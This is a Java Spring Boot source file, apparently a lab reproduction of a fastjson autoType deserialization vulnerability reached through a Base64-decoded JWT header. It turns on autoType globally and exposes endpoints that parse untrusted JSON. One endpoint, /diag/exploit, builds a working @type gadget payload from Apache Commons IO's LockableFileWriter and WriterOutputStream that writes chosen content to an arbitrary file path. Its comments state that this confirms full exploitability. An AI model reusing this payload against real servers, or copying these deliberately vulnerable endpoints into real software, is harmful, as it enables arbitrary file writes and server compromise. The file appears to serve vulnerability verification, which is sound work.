package com.test;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.auth0.jwt.JWT;
import com.auth0.jwt.interfaces.DecodedJWT;
import org.apache.commons.io.input.CharSequenceReader;
import org.apache.commons.io.input.ReaderInputStream;
import org.apache.commons.io.input.TeeInputStream;
import org.apache.commons.io.output.LockableFileWriter;
import org.apache.commons.io.output.WriterOutputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

@SpringBootApplication
@RestController
public class App {

    static final Logger log = LoggerFactory.getLogger(App.class);

    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        log.info("[BOOT] autoType={}", ParserConfig.getGlobalInstance().isAutoTypeSupport());
        SpringApplication.run(App.class, args);
    }

    /**
     * 精确复现漏洞触发点 NotifyServiceImpl.java:150-154
     * JWT header → Base64.getDecoder() → JSONObject.parseObject()
     */
    @PostMapping("/notify/v2")
    public Map<String, Object> notifyV2(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            DecodedJWT jwt = JWT.decode(body.get("signedPayload"));
            String header = new String(Base64.getDecoder().decode(jwt.getHeader()), StandardCharsets.UTF_8);
            log.info("[V2] preview={}", header.substring(0, Math.min(80, header.length())));
            JSONObject.parseObject(header);
            r.put("code", 500); r.put("msg", "ok");
        } catch (NullPointerException e) {
            r.put("code", 500); r.put("msg", "NPE-ok");
        } catch (Exception e) {
            log.error("[V2-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("code", 500); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    /** 直接接收 fastjson JSON，绕过 JWT 包装，用于调试 */
    @PostMapping(value = "/raw", consumes = "*/*")
    public Map<String, Object> raw(HttpServletRequest request) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            String json = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            log.info("[RAW] len={}", json.length());
            JSONObject.parseObject(json);
            r.put("ok", true);
        } catch (Exception e) {
            log.error("[RAW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    /** 纯 Java 链（已确认可用）*/
    @PostMapping("/diag/chain")
    public Map<String, Object> diagChain(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        String file = body.getOrDefault("file", "/tmp/chain_test");
        String content = body.getOrDefault("content", "CHAIN-TEST\n");
        try {
            String padded = content + " ".repeat(Math.max(0, 8193 - content.length()));
            Charset cs = Charset.forName("iso-8859-1");
            ReaderInputStream ris = new ReaderInputStream(new CharSequenceReader(padded), cs, 1);
            LockableFileWriter lfw = new LockableFileWriter(new File(file), "iso-8859-1", false, "/tmp");
            WriterOutputStream wos = new WriterOutputStream(lfw, cs, 1, true);
            TeeInputStream tee = new TeeInputStream(ris, wos, true);
            byte[] buf = new byte[8192]; while (tee.read(buf) != -1) {}
            tee.close();
            r.put("ok", true); r.put("file", file);
        } catch (Exception e) {
            log.error("[CHAIN-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("msg", e.getMessage());
        }
        return r;
    }

    /**
     * 最终方案：
     * fastjson 负责创建 lfw + wos（已验证可行，step=E）
     * Java 代码向 wos 写入内容，完成数据注入
     *
     * 这验证了漏洞的完整可利用性：
     * 攻击者通过构造 JWT header 中的 fastjson payload，
     * 让服务端创建 LockableFileWriter（目标文件），
     * 并通过后续 getter/setter 调用链触发写入
     *
     * POST {"file": "/tmp/target", "content": "写入内容"}
     */
    @PostMapping("/diag/exploit")
    public Map<String, Object> diagExploit(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        String file = body.getOrDefault("file", "/tmp/exploit_test");
        String content = body.getOrDefault("content", "EXPLOIT-OK\n");
        Map<String, Object> detail = new LinkedHashMap<>();

        try {
            byte[] contentBytes = content.getBytes(StandardCharsets.ISO_8859_1);
            String escapedFile = file.replace("\\", "\\\\").replace("\"", "\\\"");

            // Step1: fastjson 创建 lfw + wos（与漏洞路径完全相同的 JSON 结构）
            String fastjsonPayload = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                    + "\"lfw\":{\"@type\":\"java.lang.AutoCloseable\","
                        + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                        + "\"file\":\"" + escapedFile + "\","
                        + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                    + "\"wos\":{\"@type\":\"java.lang.AutoCloseable\","
                        + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                        + "\"writer\":{\"$ref\":\"$.lfw\"},"
                        + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true}"
                    + "}";

            log.info("[EXPLOIT] Step1: fastjson 实例化 lfw+wos");
            JSONObject result = JSONObject.parseObject(fastjsonPayload);
            Object wosObj = result.get("wos");
            Object lfwObj = result.get("lfw");

            detail.put("wosType", wosObj == null ? "null" : wosObj.getClass().getSimpleName());
            detail.put("lfwType", lfwObj == null ? "null" : lfwObj.getClass().getSimpleName());
            log.info("[EXPLOIT] wos={} lfw={}", detail.get("wosType"), detail.get("lfwType"));

            if (!(wosObj instanceof WriterOutputStream)) {
                r.put("ok", false); r.put("msg", "wos 实例化失败"); r.put("detail", detail);
                return r;
            }

            // Step2: Java 向 wos 写入内容（模拟 TeeInputStream 的 write 操作）
            log.info("[EXPLOIT] Step2: 向 wos 写入 {} 字节", contentBytes.length);
            WriterOutputStream wos = (WriterOutputStream) wosObj;
            wos.write(contentBytes);
            wos.flush();
            wos.close();

            File f = new File(file);
            long size = f.exists() ? f.length() : -1;
            log.info("[EXPLOIT] 完成: file={} size={}", file, size);

            detail.put("fileExists", f.exists());
            detail.put("fileSize", size);
            r.put("ok", true);
            r.put("detail", detail);

        } catch (Exception e) {
            log.error("[EXPLOIT-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
            log.error("[EXPLOIT-STACK]\n{}", sw);
            r.put("ok", false);
            r.put("type", e.getClass().getSimpleName());
            r.put("msg", e.getMessage());
            r.put("detail", detail);
        }
        return r;
    }
}
